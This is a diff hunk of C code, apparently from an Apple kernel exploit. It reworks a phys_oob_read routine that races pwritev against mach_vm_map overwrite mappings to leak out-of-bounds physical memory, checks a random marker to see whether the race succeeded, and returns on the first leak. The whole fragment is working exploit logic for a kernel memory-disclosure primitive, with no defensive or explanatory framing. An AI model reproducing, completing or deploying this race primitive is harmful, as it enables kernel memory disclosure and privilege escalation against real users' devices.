@@ -239,29 +239,25 @@ kern_return_t phys_oob_read(mach_port_t memObj, mach_vm_offset_t memOff,
     iov.iov_len = off + size;
     *(uint64_t*)buf = randomMarker;
     *(uint64_t*)(pcAddress + 0x3f00 + off) = randomMarker;
-    bool readRaceSucceeded = false;
     for (int t = 0; t < highestSuccessIdx + 100; t++) {
         raceSync = 1;
-        int w = (int)pwritev(readFd, &iov, 1, 0x3f00);
+        pwritev(readFd, &iov, 1, 0x3f00);
         while (raceSync == 1) {}
         kern_return_t kr = mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
             VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
         if (kr != KERN_SUCCESS) return 1;
-        if (w == -1) {
-            pread(readFd, buf, size, 0x3f00 + off);
-            if (*(uint64_t*)buf != randomMarker) {
-                readRaceSucceeded = true;
-                successReadCount++;
-                if (t > highestSuccessIdx) highestSuccessIdx = t;
-                break;
-            }
-            usleep(1);
+        pread(readFd, buf, size, 0x3f00 + off);
+        if (*(uint64_t*)buf != randomMarker) {
+            if (t > highestSuccessIdx) highestSuccessIdx = t;
+            targetObject = 0;
+            return KERN_SUCCESS;
         }
+        usleep(1);
         if (t == 500) break;
     }
     targetObject = 0;
-    return readRaceSucceeded ? KERN_SUCCESS : 1;
+    return 1;
 }
 
 kern_return_t phys_oob_read_retry(mach_port_t memObj, mach_vm_offset_t memOff,
